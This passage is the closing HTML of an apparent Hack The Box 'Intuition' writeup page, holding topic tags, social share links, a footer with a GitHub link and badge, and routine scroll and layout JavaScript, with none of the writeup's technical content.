    <a href="/search?q=command-execution" class="tag" style="font-family: 'Cascadia Code';">command-execution</a>
    
    
</div>
  <br>
  Share this writeup:&nbsp;
  <a
    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/Intuition.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
      class="fa fa-facebook-official" aria-hidden="true"></i></a>&nbsp;
  <a
    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/Intuition.html&text=Writeup+for+HTB Intuition writeup+from+HTB+held+on+14 September 2024&hashtags=ctf,writeup,Intuition,HTB,xss,cookie-hijacking,cve-2023-24329,urllib,ssrf,ssrf-to-lfi,url-wrappers,ftp,ssh-key,ssh-key-comments,sqlite,hash-cracking,binary-analysis,suricata-logs,sudoers,ghidra,command-execution','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
      class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;
  <a
    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/Intuition.html&text=Writeup+for+HTB Intuition writeup+from+HTB+held+on+2024-09-14 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
      class="fa fa-linkedin" aria-hidden="true"></i></a>
</div>
    </section>
  </div>

  <div id="comments" class="container">
    <section id="disqus_container">
      
    </section>
  </div>

  <footer>
    <div class="social d-flex flex-column justify-content-center w-100">
    <a href="/search" class="text-center w-100 mt-3 mb-2">
      <i class="fa fa-sm fa-search"></i>
    </a>
    <div class="social-links-bar d-flex justify-content-center mb-2">
        
        
        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
        </a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    </div>
    
    <div class="htb_badge d-flex justify-content-center">
        
        <script src="https://www.hackthebox.eu/badge/831031"></script>
        
    </div>
    <div class="thm_badge">
        
    </div>
    
</div>

  </footer>

  <script src="http://localhost:4000/assets/js/prism.js"></script>
  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
  <script>
    topScroll = document.getElementById("top");

    window.onscroll = function () { scrollFunction() };

    function scrollFunction() {
      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
        topScroll.style.display = "block";
      } else {
        topScroll.style.display = "none";
      }
    }

    function topFunction() {
      document.body.scrollTop = 0;
      document.documentElement.scrollTop = 0;
    }

    $(window).on('load', function () {

      $('a[download]').each((i, e) => {
        $(e).addClass('fa fa-download');
      });

      setSizes();
    });

    $(window).resize(setSizes);

    function setSizes() {
      if ($(window).width() < 960) {
        $('#bottom-bar').hide();
        $('footer').show();
        $('#navbarSupportedContent').css('max-height', 'unset');
        $('.navbar-collapse').collapse('hide');
        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
          $('footer').css("position", "unset");
        } else {
          $('footer').css("position", "fixed");
        }
      }
      else {
        $('#bottom-bar').show();
        $('footer').hide();
        $('.navbar-collapse').collapse('hide');
        $('footer').css("position", "fixed");
        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
      }
    }
  </script>

</body>

</html>
